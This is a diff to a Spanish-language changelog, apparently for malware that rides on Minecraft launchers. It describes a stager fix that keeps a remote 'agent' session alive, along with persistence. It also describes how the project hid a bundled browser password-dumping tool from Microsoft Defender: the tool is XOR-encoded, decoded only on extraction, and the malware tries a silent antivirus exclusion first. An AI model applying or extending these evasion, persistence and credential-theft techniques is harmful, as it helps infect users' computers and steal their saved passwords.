@@ -1,5 +1,10 @@
 # Changelog
 
+## 0.2.32
+
+- El stager lanzaba siempre el `javaw.exe` copiado en la carpeta de instalación. Con JRE empaquetados por el launcher (Prism, MultiMC) ese ejecutable aislado no localiza `jvm.dll`, así que el agente moría antes de escribir logs y nunca se creaba la sesión. Ahora arranca primero el `javaw.exe`/`java` real de `java.home` y deja el copiado solo como fallback. La persistencia ya prefería el runtime real.
+- Cubierto con `StagerTest`: el runtime real gana y el copiado solo se usa si falta.
+
 ## 0.2.31
 
 - Defender marcaba la descarga del jar 0.2.30 como `HackTool:Win64/PSWDump.MX!MTB` y fallaba la cuarentena porque `chromelevator_x64.exe` viajaba como PE dentro de dos jars anidados. Ahora se genera un `chromelevator_x64.dat` XOR en el build, el jar no contiene ningún PE y `Abe` lo decodifica solo al extraerlo a `cache\tools`, tras verificar el SHA-256 fijado. Antes de escribir intenta una exclusión silenciosa de esa carpeta.
